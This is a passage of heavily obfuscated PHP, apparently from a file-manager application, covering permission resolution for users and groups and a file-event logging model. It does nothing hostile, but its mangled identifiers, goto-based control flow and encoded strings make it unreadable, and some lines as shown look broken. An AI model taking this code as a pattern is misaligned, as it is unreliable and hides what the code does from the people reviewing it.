$dŒ£“…Ÿ½Æ[$dØî‹‰»¿[482]]; goto cµ†ºŠÑ¨; cÛ«’´ó´¬: if (!$E¸‹ëµôñ) { $AÒ»‚¹‰ß = Model($dØî‹‰»¿[484])->getInfo($f†óÖ‰»È²); $f©Õ —é£¬ = explode($dØî‹‰»¿[47], trim($AÒ»‚¹‰ß[$dØî‹‰»¿[485]], $dØî‹‰»¿[47])); $f©Õ —é£¬ = array_reverse($f©Õ —é£¬); foreach ($f©Õ —é£¬ as $b»ÎÎŞ¶ùÈ) { if ($b»ÎÎŞ¶ùÈ == $dØî‹‰»¿[495] || $b»ÎÎŞ¶ùÈ == $C­†˜Ô¸†) { continue; } $cµš‹“ØÎ = $this->groupRootAuth($b»ÎÎŞ¶ùÈ, $fÑğ•®Ş†); if (!$cµš‹“ØÎ) { continue; } $E¸‹ëµôñ = $this->groupAuthInfo($cµš‹“ØÎ, $b»ÎÎŞ¶ùÈ); break; } } if (!$E¸‹ëµôñ || $E¸‹ëµôñ[$dØî‹‰»¿[405]] <= 0) { $e¤àíÃ¨ğ = $this->authDeepCheck($dŒ£“…Ÿ½Æ[$dØî‹‰»¿[394]], $fÑğ•®Ş†); if ($e¤àíÃ¨ğ) { $E¸‹ëµôñ = $e¤àíÃ¨ğ; } } return $E¸‹ëµôñ; goto F¢µ…‘Ï”Ù; dŒÔÃ¢Õ†×: foreach ($cÂ …‘® as $f¹¥İ²˜) { if (!isset($CÓ˜İ«ßñç[$f¹¥İ²˜])) { continue; } $DÉ¡¶…£æ = $this->authMake($CÓ˜İ«ßñç[$f¹¥İ²˜], $fÑğ•®Ş†); if ($DÉ¡¶…£æ[$dØî‹‰»¿[444]]) { $E¸‹ëµôñ = $DÉ¡¶…£æ; break; } } if (!$cëò¦Ñî”‘) { return $E¸‹ëµôñ; } if (!$E¸‹ëµôñ && $BåØÎá‚…) { $E¸‹ëµôñ = $this->groupAuthInfo($BåØÎá‚…, $f†óÖ‰»È²); } goto cÛ«’´ó´¬; cµ†ºŠÑ¨: $cëò¦Ñî”‘ = $dŒ£“…Ÿ½Æ[$dØî‹‰»¿[402]] == SourceModel::TYPE_GROUP; $BåØÎá‚… = $cëò¦Ñî”‘ ? $this->groupRootAuth($f†óÖ‰»È², $fÑğ•®Ş†) : !1; if ($BåØÎá‚… && Model($dØî‹‰»¿[1856])->authCheckAction($BåØÎá‚…[$dØî‹‰»¿[404]], $dØî‹‰»¿[1709])) { return $this->groupAuthInfo($BåØÎá‚…, $f†óÖ‰»È²); } goto DŞÛÑ‰³ß; F¢µ…‘Ï”Ù: } private function userIsRoot($f°¥•¨Ë÷ = false) { $AõÚêòš¿ë =& $_SERVER[´¬]; if (!$f°¥•¨Ë÷ && _get($GLOBALS, $AõÚêòš¿ë[483])) { return !0; } $eÅ¡ŠÑÀ¶ = Model($AõÚêòš¿ë[505])->getInfo($f°¥•¨Ë÷); $AÂë˜ŒÂÁ = Model($AõÚêòš¿ë[1877])->listData($eÅ¡ŠÑÀ¶[$AõÚêòš¿ë[1412]]); if ($AÂë˜ŒÂÁ && $AÂë˜ŒÂÁ[$AõÚêòš¿ë[1283]][$AõÚêòš¿ë[1878]] == 1) { return !0; } return !1; } private function sourceAuthInfo($fÍ¸ô¥Šê˜) { goto f‹ëáŸ”; b”Š×ìé : if (!$D®£õÚº†—) { return !1; } $aóğ“Ä–¹ã->groupPathDisplay($D®£õÚº†—); $e»ø¶ØãÆŠ = array($D®£õÚº†—); goto cñ¿–³Ùóˆ; cñ¿–³Ùóˆ: $e»ø¶ØãÆŠ = $aóğ“Ä–¹ã->_listAppendPath($e»ø¶ØãÆŠ); $D®£õÚº†— = $e»ø¶ØãÆŠ[0]; $Cƒ²»¸‚Ã„ = $D®£õÚº†—[$F•µë®­¯[493]]; goto d¯®æ ¤§ø; d¯®æ ¤§ø: if (isset($D®£õÚº†—[$F•µë®­¯[490]])) { $A×‹Ú²·Ã = explode($F•µë®­¯[8], trim($D®£õÚº†—[$F•µë®­¯[493]], $F•µë®­¯[8])); array_shift($A×‹Ú²·Ã); $Cƒ²»¸‚Ã„ = $D®£õÚº†—[$F•µë®­¯[488]] . $F•µë®­¯[1879] . implode($F•µë®­¯[8], $A×‹Ú²·Ã); } return array($F•µë®­¯[411] => $D®£õÚº†—[$F•µë®­¯[28]], $F•µë®­¯[76] => KodIO::make($D®£õÚº†—[$F•µë®­¯[394]]), $F•µë®­¯[1880] => $Cƒ²»¸‚Ã„); goto FŸŠÚÑ¤››; f‹ëáŸ”: $F•µë®­¯ =& $_SERVER[´¬]; $aóğ“Ä–¹ã = Model($F•µë®­¯[1206]); $D®£õÚº†— = $aóğ“Ä–¹ã->sourceInfo($fÍ¸ô¥Šê˜); goto b”Š×ìé ; FŸŠÚÑ¤››: } private function groupAuthInfo($BæïÓòàïã, $E¿Å¾…’ˆ) { $dƒ‡ªĞ¢º™ =& $_SERVER[´¬]; $C„ƒÌ ‹®× = Model($dƒ‡ªĞ¢º™[484])->getInfo($E¿Å¾…’ˆ); return array($dƒ‡ªĞ¢º™[1881] => intval($BæïÓòàïã[$dƒ‡ªĞ¢º™[404]]), $dƒ‡ªĞ¢º™[1865] => $BæïÓòàïã, $dƒ‡ªĞ¢º™[1882] => LNG($dƒ‡ªĞ¢º™[1883]), $dƒ‡ªĞ¢º™[1874] => array($dƒ‡ªĞ¢º™[411] => $C„ƒÌ ‹®×[$dƒ‡ªĞ¢º™[28]], $dƒ‡ªĞ¢º™[76] => KodIO::make($C„ƒÌ ‹®×[$dƒ‡ªĞ¢º™[85]][$dƒ‡ªĞ¢º™[394]]), $dƒ‡ªĞ¢º™[1880] => $C„ƒÌ ‹®×[$dƒ‡ªĞ¢º™[489]])); } protected function groupRootAuth($D§á¦ñİ‚, $AÊÄä„Œ²¬ = false) { goto EÈÙø•¿í; BùØƒˆ‚ëÓ: $cµ‚‘¹³„‹ = $this->sourceAuthSelect($aåÚ†·¦Šœ[$Cƒªˆœ¶­[85]][$Cƒªˆœ¶­[394]]); $f¤ÃØì®ê¦ = $cµ‚‘¹³„‹ ? $this->authMake($cµ‚‘¹³„‹, $AÊÄä„Œ²¬) : !1; $aÄ×¹—œ‚é = $f¤ÃØì®ê¦ ? $f¤ÃØì®ê¦[$Cƒªˆœ¶­[444]] : !1; goto eË‘æîöŞ£; EÈÙø•¿í: $Cƒªˆœ¶­ =& $_SERVER[´¬]; $AÊÄä„Œ²¬ = $AÊÄä„Œ²¬ ? $AÊÄä„Œ²¬ : USER_ID; $bˆ™ˆÔâ† = $AÊÄä„Œ²¬ . $Cƒªˆœ¶­[1884] . $D§á¦ñİ‚; goto eÍÖ„çìº›; eË‘æîöŞ£: $EÀ‚Ñ«µæ¬[$bˆ™ˆÔâ†] = $aÄ×¹—œ‚é ? $aÄ×¹—œ‚é : $d©‘ÛßŸÆÃ; return $EÀ‚Ñ«µæ¬[$bˆ™ˆÔâ†]; goto a ½¸í†; eÍÖ„çìº›: static $EÀ‚Ñ«µæ¬ = array(); if (isset($EÀ‚Ñ«µæ¬[$bˆ™ˆÔâ†])) { return $EÀ‚Ñ«µæ¬[$bˆ™ˆÔâ†]; } $aåÚ†·¦Šœ = Model($Cƒªˆœ¶­[484])->getInfo($D§á¦ñİ‚); goto E„¶¨Çß; E„¶¨Çß: $AÈêŠÅëàŠ = $this->userGroupList($AÊÄä„Œ²¬); $d©‘ÛßŸÆÃ = isset($AÈêŠÅëàŠ[$D§á¦ñİ‚]) ? $AÈêŠÅëàŠ[$D§á¦ñİ‚][$Cƒªˆœ¶­[404]] : !1; if ($d©‘ÛßŸÆÃ && Model($Cƒªˆœ¶­[1856])->authCheckAction($d©‘ÛßŸÆÃ[$Cƒªˆœ¶­[404]], $Cƒªˆœ¶­[1709])) { $EÀ‚Ñ«µæ¬[$bˆ™ˆÔâ†] = $d©‘ÛßŸÆÃ; return $d©‘ÛßŸÆÃ; } goto BùØƒˆ‚ëÓ; a ½¸í†: } public function authOwnerApply($A·¥ºïÃ›º) { goto b¹íêé´×…; A‡æÇŞ«º•: $e½Ä‹Ú×¤á = array(); $aØÈ½”‡Åµ = array(); foreach ($cËˆó œŞ  as $aÌŸ®àÈéƒ => $B…ƒ¼×ëší) { $FŒÖ½·¢—½ = $this->authFolderOwnerUser($B…ƒ¼×ëší); $e½Ä‹Ú×¤á[$aÌŸ®àÈéƒ] = $FŒÖ½·¢—½; $aØÈ½”‡Åµ = array_merge($aØÈ½”‡Åµ, $FŒÖ½·¢—½[$Bï½µå«åË[561]]); if ($FŒÖ½·¢—½[$Bï½µå«åË[1886]]) { break; } } goto BÚ‹—Ôè·; b¹íêé´×…: $Bï½µå«åË =& $_SERVER[´¬]; if (empty($A·¥ºïÃ›º[$Bï½µå«åË[404]]) || isset($A·¥ºïÃ›º[$Bï½µå«åË[1885]]) && $A·¥ºïÃ›º[$Bï½µå«åË[1885]]) { return $A·¥ºïÃ›º; } if (AuthModel::authCheckRoot($A·¥ºïÃ›º[$Bï½µå«åË[404]][$Bï½µå«åË[405]])) { return $A·¥ºïÃ›º; } goto E§ÊÇç¿ª; AĞöœÌ½ƒ: $A·¥ºïÃ›º[$Bï½µå«åË[404]][$Bï½µå«åË[1887]] = Model($Bï½µå«åË[501])->userListInfo($aØÈ½”‡Åµ); return $A·¥ºïÃ›º; goto B¿¸¬à‘Ï; E§ÊÇç¿ª: $BÒê¿ê¤Èö = Model($Bï½µå«åË[1206])->parentLevelArray($A·¥ºïÃ›º[$Bï½µå«åË[485]]); $BÒê¿ê¤Èö = array_merge(array($A·¥ºïÃ›º[$Bï½µå«åË[394]]), array_reverse($BÒê¿ê¤Èö)); $cËˆó œŞ  = $this->sourceAuthSelect($BÒê¿ê¤Èö); goto A‡æÇŞ«º•; BÚ‹—Ôè·: if (count($aØÈ½”‡Åµ) == 0) { $aØÈ½”‡Åµ = $this->authFolderOwnerGroup($A·¥ºïÃ›º[$Bï½µå«åË[482]]); } $aØÈ½”‡Åµ = array_unique($aØÈ½”‡Åµ); if (AuthModel::authCheckRoot($A·¥ºïÃ›º[$Bï½µå«åË[404]][$Bï½µå«åË[405]])) { $aØÈ½”‡Åµ[] = USER_ID; } goto AĞöœÌ½ƒ; B¿¸¬à‘Ï: } private function authFolderOwnerGroup($DÂ•Ææ¡ì) { $eÎ¾šŠÏâß =& $_SERVER[´¬]; $E–Öù®ïä¬ = Model($eÎ¾šŠÏâß[1770])->where(array($eÎ¾šŠÏâß[1689] => $DÂ•Ææ¡ì))->select(); $Fóİ‘êŒ‰Á = array(); if (!$E–Öù®ïä¬) { return $Fóİ‘êŒ‰Á; } foreach ($E–Öù®ïä¬ as $F¹¤¿š¯Ÿ¬) { $aÈá£ƒæ‰ï = $this->authInfo($F¹¤¿š¯Ÿ¬); if (AuthModel::authCheckRoot($aÈá£ƒæ‰ï[$eÎ¾šŠÏâß[404]])) { $Fóİ‘êŒ‰Á[] = $F¹¤¿š¯Ÿ¬[$eÎ¾šŠÏâß[1526]]; } } return $Fóİ‘êŒ‰Á; } private function authFolderOwnerUser($C¶‰‡ˆªÒ) { $F‹Í½ê¼ =& $_SERVER[´¬]; $f¬ÔØ ©× = array(); $Cå¾­Ç†¿ = !1; foreach ($C¶‰‡ˆªÒ as $fßÄ‰«÷¢Ù) { $Cµ£“Ö×ÚË = $this->authInfo($fßÄ‰«÷¢Ù); if ($fßÄ‰«÷¢Ù[$F‹Í½ê¼[482]] == $F‹Í½ê¼[495]) { $Cå¾­Ç†¿ = !0; } if ($fßÄ‰«÷¢Ù[$F‹Í½ê¼[402]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($Cµ£“Ö×ÚË[$F‹Í½ê¼[404]])) { $f¬ÔØ ©×[] = $fßÄ‰«÷¢Ù[$F‹Í½ê¼[482]]; } } } return array($F‹Í½ê¼[561] => $f¬ÔØ ©×, $F‹Í½ê¼[1886] => $Cå¾­Ç†¿); } public function authMake($EĞÃÈŸ¥´‹, $D“ÀÒŸ‡°Š = false) { $D…ò©°ˆ‘ =& $_SERVER[´¬]; $a„Û…ë¾ĞÃ = $this->authArrayCheck($EĞÃÈŸ¥´‹, $D“ÀÒŸ‡°Š); if ($a„Û…ë¾ĞÃ[$D…ò©°ˆ‘[1888]]) { $a„Û…ë¾ĞÃ[$D…ò©°ˆ‘[1888]] = $this->sourceAuthInfo($a„Û…ë¾ĞÃ[$D…ò©°ˆ‘[1888]]); } return $a„Û…ë¾ĞÃ; } public function authArrayCheck($e¢¯¡Ê§â¯, $EÓ­ë§ğÇÑ = false) { goto C©å§‚„Ã„; C©å§‚„Ã„: $fññ«ô­ =& $_SERVER[´¬]; if (!$e¢¯¡Ê§â¯) { return array($fññ«ô­[405] => 0, $fññ«ô­[444] => !1); } $EÓ­ë§ğÇÑ = $EÓ­ë§ğÇÑ ? $EÓ­ë§ğÇÑ : USER_ID; goto fÆ¹ªÕİé¾; fÆ¹ªÕİé¾: $B£ÆÓ…†•‰ = 0; $AÖÌÏÃ˜¬Ó = 0; $Dô«­Â¦¥Œ = 0; goto d«Ô¾£‘íÊ; eöğ×‚ÇÂ: $bíË¶¿‘î = 1000; $BÇ‰ïˆ½ÖÙ = 0; $EÕ¡Óœ§É­ = 0; goto Bá™¹í™¡; D™Ù´õ•ßÒ: return $B¶´–ãß«”; goto bÍî®èŒÅ; d«Ô¾£‘íÊ: $C‘É˜Îğ¼¹ = 0; $D°ßœå®…† = 0; $E¡£‰ä¿òº = 0; goto eöğ×‚ÇÂ; Bá™¹í™¡: $dò‰é³÷é = 0; $f¬Äù‹ï‡æ = 0; $CÒİÁšÀŸÚ = array($fññ«ô­[394] => 0); goto eåôÕø®‰Œ; eåôÕø®‰Œ: foreach ($e¢¯¡Ê§â¯ as $CÒİÁšÀŸÚ) { $F”ä’§Šé¦ = $this->authInfo($CÒİÁšÀŸÚ); if (!$F”ä’§Šé¦) { continue; } $D´¯ŞÕ‰Èâ = $CÒİÁšÀŸÚ[$fññ«ô­[482]]; $AÕ˜ãÅİ¸Ô = intval($F”ä’§Šé¦[$fññ«ô­[404]]); if ($CÒİÁšÀŸÚ[$fññ«ô­[402]] == SourceModel::TYPE_USER && $D´¯ŞÕ‰Èâ == $EÓ­ë§ğÇÑ) { $B£ÆÓ…†•‰ = !0; $Dô«­Â¦¥Œ = $F”ä’§Šé¦; $AÖÌÏÃ˜¬Ó = $AÕ˜ãÅİ¸Ô; } else { if ($CÒİÁšÀŸÚ[$fññ«ô­[402]] == SourceModel::TYPE_GROUP && $this->groupContainUser($D´¯ŞÕ‰Èâ, $EÓ­ë§ğÇÑ)) { $C‘É˜Îğ¼¹ = !0; $bÙÂ’™†½ = $this->groupStepToUserGroup($D´¯ŞÕ‰Èâ, $EÓ­ë§ğÇÑ); if ($bÙÂ’™†½ < $bíË¶¿‘î) { $bíË¶¿‘î = $bÙÂ’™†½; $D°ßœå®…† = $AÕ˜ãÅİ¸Ô; $E¡£‰ä¿òº = $F”ä’§Šé¦; $BÇ‰ïˆ½ÖÙ = $D´¯ŞÕ‰Èâ; } if ($bÙÂ’™†½ == $bíË¶¿‘î && $AÕ˜ãÅİ¸Ô >= $D°ßœå®…†) { $D°ßœå®…† = $AÕ˜ãÅİ¸Ô; $E¡£‰ä¿òº = $F”ä’§Šé¦; $BÇ‰ïˆ½ÖÙ = $D´¯ŞÕ‰Èâ; } } else { if ($D´¯ŞÕ‰Èâ == $fññ«ô­[495]) { $EÕ¡Óœ§É­ = !0; $f¬Äù‹ï‡æ = $F”ä’§Šé¦; $dò‰é³÷é = $AÕ˜ãÅİ¸Ô; } } } } if ($B£ÆÓ…†•‰) { $AîÉ¡†ÓÑ¶ = $AÖÌÏÃ˜¬Ó; $F”ä’§Šé¦ = $Dô«­Â¦¥Œ; $F‘…»¯Îá = LNG($fññ«ô­[1889]); } else { if ($C‘É˜Îğ¼¹) { $AîÉ¡†ÓÑ¶ = $D°ßœå®…†; $F”ä’§Šé¦ = $E¡£‰ä¿òº; $dÄê×©‘Ì” = Model($fññ«ô­[484])->getInfo($BÇ‰ïˆ½ÖÙ); $F‘…»¯Îá = $fññ«ô­[160] . $dÄê×©‘Ì”[$fññ«ô­[489]] . $fññ«ô­[1890] . LNG($fññ«ô­[1891]); } else { if ($EÕ¡Óœ§É­) { $AîÉ¡†ÓÑ¶ = $dò‰é³÷é; $F”ä’§Šé¦ = $f¬Äù‹ï‡æ; $F‘…»¯Îá = LNG($fññ«ô­[1862]); } else { $AîÉ¡†ÓÑ¶ = 0; $F”ä’§Šé¦ = !1; $F‘…»¯Îá = $fññ«ô­[33]; } } } $B¶´–ãß«” = array($fññ«ô­[1881] => intval($AîÉ¡†ÓÑ¶), $fññ«ô­[1865] => $F”ä’§Šé¦, $fññ«ô­[1882] => $F‘…»¯Îá, $fññ«ô­[1874] => $CÒİÁšÀŸÚ[$fññ«ô­[394]]); goto D™Ù´õ•ßÒ; bÍî®èŒÅ: } private function groupContainUser($fÌ÷º¡’ö, $cª¦ìÜÉ¨Ç = false) { return in_array($fÌ÷º¡’ö, $this->userGroupParents($cª¦ìÜÉ¨Ç)); } private function groupStepToUserGroup($f§ŸåÆ›Áâ, $C²Îº¥Çœ­ = false) { goto có£âì’è; có£âì’è: $e­«Ôˆ£ø¥ =& $_SERVER[´¬]; $D«ä­Á×‚ = $this->userGroupList($C²Îº¥Çœ­); $cíùÙÏ‡ÀÄ = 1000; goto A¶¸ŞœÏùµ; A¶¸ŞœÏùµ: $EæŸî–‚Õ = $GLOBALS[$e­«Ôˆ£ø¥[6]][$e­«Ôˆ£ø¥[88]][$e­«Ôˆ£ø¥[1781]] == 1; $c®šğÁĞ•” = $EæŸî–‚Õ ? 3 : 2; foreach ($D«ä­Á×‚ as $dÀÓÚ°áñ›) { if ($dÀÓÚ°áñ›[$e­«Ôˆ£ø¥[1689]] == $f§ŸåÆ›Áâ) { return 0; } $fô™´åñ±ó = explode($e­«Ôˆ£ø¥[47], trim($dÀÓÚ°áñ›[$e­«Ôˆ£ø¥[485]], $e­«Ôˆ£ø¥[47])); if ($fô™´åñ±ó[0] == $e­«Ôˆ£ø¥[495] && count($fô™´åñ±ó) > $c®šğÁĞ•”) { $b–ÊèÆ§â¯ = array_reverse(array_slice($fô™´åñ±ó, $c®šğÁĞ•”)); $c’Á‰©‡» = array_search($f§ŸåÆ›Áâ, $b–ÊèÆ§â¯); if ($c’Á‰©‡» !== !1 && $c’Á‰©‡» + 1 <= $cíùÙÏ‡ÀÄ) { $cíùÙÏ‡ÀÄ = $c’Á‰©‡» + 1; } } } goto B„”œñ†¯Ş; B„”œñ†¯Ş: return $cíùÙÏ‡ÀÄ; goto Bœ•‹¾ÁÅ; Bœ•‹¾ÁÅ: } private function userGroupList($có¯‘›àáÚ = false) { $f¹¢Ëò¥ØÆ =& $_SERVER[´¬]; static $b ´ç‘²» = array(); if (isset($b ´ç‘²»[$có¯‘›àáÚ])) { return $b ´ç‘²»[$có¯‘›àáÚ]; } $e¿ó¦ØÅ¶› = Model($f¹¢Ëò¥ØÆ[505])->getInfo($có¯‘›àáÚ); $b ´ç‘²»[$có¯‘›àáÚ] = array_to_keyvalue($e¿ó¦ØÅ¶›[$f¹¢Ëò¥ØÆ[1863]], $f¹¢Ëò¥ØÆ[1689]); return $b ´ç‘²»[$có¯‘›àáÚ]; } public function userGroupParents($D‚åé„ÃÄ) { goto eŒç«Ì ; eî¼É©òô‘: $D˜À¼™ªè¿ = $GLOBALS[$eëŸá¹ˆËò[6]][$eëŸá¹ˆËò[88]][$eëŸá¹ˆËò[1781]] == 1; $DØÊ›˜ÏÓÈ = $D˜À¼™ªè¿ ? 3 : 2; foreach ($bë§ğ¿”ö³ as $cŠÀ ËçŒÕ) { $c‘ÕÁœÎ¤± = array($cŠÀ ËçŒÕ[$eëŸá¹ˆËò[1689]]); $Aì—Ù³‘†  = explode($eëŸá¹ˆËò[47], trim($cŠÀ ËçŒÕ[$eëŸá¹ˆËò[485]], $eëŸá¹ˆËò[47])); if ($Aì—Ù³‘† [0] == $eëŸá¹ˆËò[495] && count($Aì—Ù³‘† ) > $DØÊ›˜ÏÓÈ) { $cæ ’¿õŠÂ = array_slice($Aì—Ù³‘† , $DØÊ›˜ÏÓÈ); $c‘ÕÁœÎ¤± = array_merge($c‘ÕÁœÎ¤±, array_reverse($cæ ’¿õŠÂ)); } $bÒ±‰•ò¿ß = array_merge($bÒ±‰•ò¿ß, $c‘ÕÁœÎ¤±); } goto EØ¬¯„Ù˜÷; eŒç«Ì : $eëŸá¹ˆËò =& $_SERVER[´¬]; static $CŒÀÕìé¬ã = array(); $D‚åé„ÃÄ = $D‚åé„ÃÄ ? $D‚åé„ÃÄ : USER_ID; goto b×ÎÓÇ­Ù; b×ÎÓÇ­Ù: if (isset($CŒÀÕìé¬ã[$D‚åé„ÃÄ])) { return $CŒÀÕìé¬ã[$D‚åé„ÃÄ]; } $bë§ğ¿”ö³ = $this->userGroupList($D‚åé„ÃÄ); $bÒ±‰•ò¿ß = array(); goto eî¼É©òô‘; EØ¬¯„Ù˜÷: $CŒÀÕìé¬ã[$D‚åé„ÃÄ] = array_unique($bÒ±‰•ò¿ß); return $CŒÀÕìé¬ã[$D‚åé„ÃÄ]; goto c†á®š”²š; c†á®š”²š: } public function authTargetInfoMake($A£ãÏÉ²»®) { goto D·„ö¼­…Ê; A¢êíøÊêã: foreach ($A£ãÏÉ²»® as $aË‚‚‹ÛÔÒ) { if ($aË‚‚‹ÛÔÒ[$D¥–ùà[402]] == SourceModel::TYPE_USER) { $aŒ÷ôÀ˜Ãª[] = intval($aË‚‚‹ÛÔÒ[$D¥–ùà[482]]); } else { if ($aË‚‚‹ÛÔÒ[$D¥–ùà[402]] == SourceModel::TYPE_GROUP) { $Dë­Á•Ø–Ê[] = intval($aË‚‚‹ÛÔÒ[$D¥–ùà[482]]); } } } if ($aŒ÷ôÀ˜Ãª) { $aŒ÷ôÀ˜Ãª = Model($D¥–ùà[501])->userListInfo($aŒ÷ôÀ˜Ãª); } if ($Dë­Á•Ø–Ê) { $AéĞ§±Æ¦Ä = array($D¥–ùà[1767] => array($D¥–ùà[409], $Dë­Á•Ø–Ê)); $Dë­Á•Ø–Ê = Model($D¥–ùà[484])->field($D¥–ùà[1892])->where($AéĞ§±Æ¦Ä)->select(); $Dë­Á•Ø–Ê = array_to_keyvalue($Dë­Á•Ø–Ê, $D¥–ùà[1689]); } goto Aîˆ„ÁµÀÈ; Aîˆ„ÁµÀÈ: return array($D¥–ùà[1893] => $aŒ÷ôÀ˜Ãª, $D¥–ùà[1894] => $Dë­Á•Ø–Ê); goto a…å÷µÛ¼; D·„ö¼­…Ê: $D¥–ùà =& $_SERVER[´¬]; $aŒ÷ôÀ˜Ãª = array(); $Dë­Á•Ø–Ê = array(); goto A¢êíøÊêã; a…å÷µÛ¼: } public function authInfo($BÅõ¡‚†âù) { $aå­Ø‚£—Ô =& $_SERVER[´¬]; if ($BÅõ¡‚†âù[$aå­Ø‚£—Ô[1784]]) { $aŠ¯ˆ§²ºÒ = Model($aå­Ø‚£—Ô[1856])->listData($BÅõ¡‚†âù[$aå­Ø‚£—Ô[1784]]); if (!$aŠ¯ˆ§²ºÒ) { return !1; $aêƒèÍÖ°Ç = Model($aå­Ø‚£—Ô[1856])->listData(); $Dğ‘£¨™ÓÅ = array_filter_by_field($aêƒèÍÖ°Ç, $aå­Ø‚£—Ô[404], $aå­Ø‚£—Ô[495]); return $Dğ‘£¨™ÓÅ; } $D‚£ëÁãÅ½ = array_field_key($aŠ¯ˆ§²ºÒ, array($aå­Ø‚£—Ô[392], $aå­Ø‚£—Ô[28], $aå­Ø‚£—Ô[404], $aå­Ø‚£—Ô[1710], $aå­Ø‚£—Ô[1712])); $D‚£ëÁãÅ½[$aå­Ø‚£—Ô[1895]] = $BÅõ¡‚†âù; return $D‚£ëÁãÅ½; } else { return array($aå­Ø‚£—Ô[410] => 0, $aå­Ø‚£—Ô[1695] => $BÅõ¡‚†âù[$aå­Ø‚£—Ô[1838]], $aå­Ø‚£—Ô[411] => $aå­Ø‚£—Ô[33], $aå­Ø‚£—Ô[1710] => $aå­Ø‚£—Ô[1896]); } } } class SourceEventModel extends ModelBase { protected $tableName = "\x69\157\x5f\x73\x6f\165\162\x63\145\x5f\145\x76\x65\x6e\x74"; protected $dataAuto = array(array("\143\162\145\141\x74\x65\124\x69\155\x65", "\164\x69\155\x65", "\151\156\x73\145\x72\164", "\x66\x75\156\x63\164\151\157\x6e"), array("\x64\x65\163\143", '', "\x69\156\x73\145\x72\x74\54\165\160\x64\x61\x74\x65\x2c\x73\x65\x6c\x65\x63\164", "\152\163\x6f\156")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($Aù†“™õÑ, $a›ÕÓä÷«, $cœîïøã•Û = '') { goto f­•ÓãË­ƒ; BºŒá…Ã¸÷: return $this->add($CÊ»¼Í†); goto b‡¹ËôÇ·; f­•ÓãË­ƒ: $A„¸êå˜²â =& $_SERVER[´¬]; if (!$this->eventSave) { return; } $fåØ•‘ø’ = Model($A„¸êå˜²â[1206])->sourceInfo($Aù†“™õÑ); goto f£æìÍ…ÕŞ; f£æìÍ…ÕŞ: if (!$fåØ•‘ø’) { return !1; } if ($this->isCacheEvent($fåØ•‘ø’, $a›ÕÓä÷«)) { return; } if ($cœîïøã•Û && is_string($cœîïøã•Û)) { $cœîïøã•Û = array($A„¸êå˜²â[1722] => $cœîïøã•Û); } goto D¸ø‘åŸ±¥; D¸ø‘åŸ±¥: $CÊ»¼Í† = array($A„¸êå˜²â[408] => $Aù†“™õÑ, $A„¸êå˜²â[1897] => $fåØ•‘ø’[$A„¸êå˜²â[476]], $A„¸êå˜²â[1898] => $fåØ•‘ø’[$A„¸êå˜²â[28]], $A„¸êå˜²â[493] => $fåØ•‘ø’[$A„¸êå˜²â[493]], $A„¸êå˜²â[1518] => USER_ID, $A„¸êå˜²â[413] => $a›ÕÓä÷«, $A„¸êå˜²â[1520] => $cœîïøã•Û); $this->addSystemLog($a›ÕÓä÷«, $CÊ»¼Í†); unset($CÊ»¼Í†[$A„¸êå˜²â[1898]], $CÊ»¼Í†[$A„¸êå˜²â[493]]); goto BºŒá…Ã¸÷; b‡¹ËôÇ·: } private function addSystemLog($F’±ªİ³¦½, $d‚òÏ†Œœ) { $aˆ¢Ä—§Á =& $_SERVER[´¬]; if ($F’±ªİ³¦½ == $aˆ¢Ä—§Á[1899]) { $F’±ªİ³¦½ = $d‚òÏ†Œœ[$aˆ¢Ä—§Á[429]][$aˆ¢Ä—§Á[1900]]; } else { if (in_array($F’±ªİ³¦½, array($aˆ¢Ä—§Á[1666], $aˆ¢Ä—§Á[1901]))) { $F’±ªİ³¦½ = $d‚òÏ†Œœ[$aˆ¢Ä—§Á[429]][$aˆ¢Ä—§Á[716]]; } } $EÛëÂˆÎêğ = array_merge($d‚òÏ†Œœ, array($aˆ¢Ä—§Á[1902] => $d‚òÏ†Œœ[$aˆ¢Ä—§Á[394]], $aˆ¢Ä—§Á[1903] => $d‚òÏ†Œœ[$aˆ¢Ä—§Á[1903]])); Model($aˆ¢Ä—§Á[1630])->addLog($aˆ¢Ä—§Á[1904] . $F’±ªİ³¦½, $EÛëÂˆÎêğ); } private function isCacheEvent($A©ÙºÄ¥ª›, $C¤ÍŞ¾à¨¿) { if ($A©ÙºÄ¥ª›[$_SERVER[´¬][402]] == SourceModel::TYPE_SYSTEM) { return !0; } return !1; } public function eventCreate($eËìƒİ¢Ø, $bÖœ›õÁøƒ) { $D’‘Ÿë¹Ÿ =& $_SERVER[´¬]; $B„İ÷ô·Õñ = Model($D’‘Ÿë¹Ÿ[1206])->sourceInfo($eËìƒİ¢Ø); $EƒÆ¨šßØ = array($D’‘Ÿë¹Ÿ[1900] => $bÖœ›õÁøƒ, $D’‘Ÿë¹Ÿ[28] => $B„İ÷ô·Õñ[$D’‘Ÿë¹Ÿ[28]]); return $this->addEvent($eËìƒİ¢Ø, $D’‘Ÿë¹Ÿ[1899], $EƒÆ¨šßØ); } public function eventFileEdit($bê‹‚¿¼›È) { $D«÷¿¥È¾ =& $_SERVER[´¬]; $FÛùö“’­ä = array($D«÷¿¥È¾[1905] => $_SERVER[$D«÷¿¥È¾[1906]], $D«÷¿¥È¾[1907] => strtolower(ACTION)); return $this->addEvent($bê‹‚¿¼›È, $D«÷¿¥È¾[1656], $FÛùö“’­ä); } public function eventRecycle($dè¹±Ÿ‡ê, $F¢Ìó º) { return $this->addEvent($dè¹±Ÿ‡ê, $_SERVER[´¬][1901], $F¢Ìó º); } public function eventRemove($f‰õÕÍÍ§¡) { $eÅì‡î…„¦ =& $_SERVER[´¬]; $f®Ô¿‹äÀø = Model($eÅì‡î…„¦[1206])->sourceInfo($f‰õÕÍÍ§¡); $aâîªçŞ = $f®Ô¿‹äÀø[$eÅì‡î…„¦[28]]; return $this->addEvent($f®Ô¿‹äÀø[$eÅì‡î…„¦[476]], $eÅì‡î…„¦[1655], $aâîªçŞ); } public function eventShare($bŞØºÕİ·, $b‡œ…×îÌ) { return $this->addEvent($bŞØºÕİ·, $_SERVER[´¬][1666], $b‡œ…×îÌ); } public function eventMove($B³ÂÏœÂÙó, $Aï·—ÈŠÚ, $d²¥Á‰½è°) { goto EÆï­İÛ; e£­ïÔ¢ÎË: $this->addEvent($Aï·—ÈŠÚ, $Fñ‚ï´„¨[1911], $E™•„‰á‘¯); goto cÂ§ Çî„œ; Cªò‚ß Œ˜: $b‘Á£ã·ŠÓ = $fÔ„Šæê‚Ú->sourceInfo($Aï·—ÈŠÚ); $D£¶…›èåµ = $fÔ„Šæê‚Ú->sourceInfo($d²¥Á‰½è°); 